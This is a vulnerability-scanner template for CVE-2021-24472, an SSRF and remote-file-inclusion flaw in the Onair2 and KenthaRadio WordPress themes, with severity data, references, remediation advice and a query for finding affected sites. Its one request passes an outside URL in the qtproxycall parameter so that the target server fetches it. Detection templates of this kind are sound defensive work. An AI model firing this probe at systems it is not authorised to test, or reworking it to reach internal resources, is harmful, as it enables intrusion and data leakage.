id: CVE-2021-24472

info:
  name: Onair2 < 3.9.9.2 & KenthaRadio < 2.0.2 - Remote File Inclusion/Server-Side Request Forgery
  author: Suman_Kar
  severity: critical
  description: |
    Onair2 < 3.9.9.2 and KenthaRadio < 2.0.2  have exposed proxy functionality to unauthenticated users. Sending requests to this proxy functionality will have the web server fetch and display the content from any URI, allowing remote file inclusion and server-side request forgery.
  impact: |
    Remote File Inclusion/Server-Side Request Forgery vulnerability allows an attacker to include arbitrary files or make requests to internal resources, leading to potential data leakage, unauthorized access.
  remediation: |
    Update Onair2 to version 3.9.9.2 or higher and KenthaRadio to version 2.0.2 or higher to mitigate the vulnerability.
  reference:
    - https://wpscan.com/vulnerability/17591ac5-88fa-4cae-a61a-4dcf5dc0b72a
    - https://nvd.nist.gov/vuln/detail/CVE-2021-24472
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-24472
    cwe-id: CWE-918
    epss-score: 0.03476
    epss-percentile: 0.90502
    cpe: cpe:2.3:a:qantumthemes:kentharadio:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: qantumthemes
    product: kentharadio
    framework: wordpress
    publicwww-query: "/wp-content/plugins/qt-kentharadio"
  tags: cve2021,cve,wordpress,lfi,ssrf,wp,wp-plugin,wpscan,qantumthemes

http:
  - method: GET
    path:
      - '{{BaseURL}}/wp1/home-18/?qtproxycall=https://oast.me'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<h1> Interactsh Server </h1>"

      - type: status
        status:
          - 200
# digest: 4a0a00473045022100b5fd3df9739d79fc77b67211c436693d91061fe4bd30558677eb0b66c6cb7c00022012b8f638eea1650509a59beef8e73307a42c721ecb3a831ae9902dbc71741e68:922c64590222798bb761d5b6d8e72950